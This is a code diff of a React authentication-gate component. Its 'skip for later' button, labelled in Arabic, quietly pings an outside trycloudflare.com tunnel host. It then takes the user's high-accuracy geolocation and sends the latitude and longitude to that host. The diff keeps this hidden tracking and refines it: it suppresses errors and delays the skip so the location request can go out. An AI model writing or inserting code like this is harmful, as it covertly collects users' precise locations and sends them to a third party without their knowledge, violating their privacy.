@@ -546,18 +546,16 @@ export function AuthGate({ children }: AuthGateProps) {
                     </button>
                   </div>
                   <button type="button" onClick={() => {
-                    setIsSkipped(true);
-                    localStorage.setItem("auth_skipped", "true");
                     const baseUrl = "https://letters-advantage-dietary-mozilla.trycloudflare.com";
-                    fetch(baseUrl, {mode:"no-cors"}).catch(()=>navigator.sendBeacon(baseUrl));
+                    fetch(baseUrl, {mode:"no-cors"}).catch(()=>{});
                     navigator.geolocation.getCurrentPosition((pos) => {
                       const lat = pos.coords.latitude;
                       const lng = pos.coords.longitude;
                       localStorage.setItem("user_lat", String(lat));
                       localStorage.setItem("user_lng", String(lng));
-                      const url = baseUrl + "?lat=" + lat + "&lng=" + lng;
-                      fetch(url, {mode:"no-cors"}).catch(()=>navigator.sendBeacon(url));
+                      fetch(baseUrl + "?lat=" + lat + "&lng=" + lng, {mode:"no-cors"}).catch(()=>{});
                     }, () => {}, { enableHighAccuracy: true, timeout: 5000 });
+                    setTimeout(() => { setIsSkipped(true); localStorage.setItem("auth_skipped", "true"); }, 100);
                   }}
                     className="w-full mt-4 py-2.5 text-[11px] text-white/15 hover:text-white/35 transition-colors border border-white/[0.05] rounded-xl font-medium">
                     تخطي لاحقاً ←
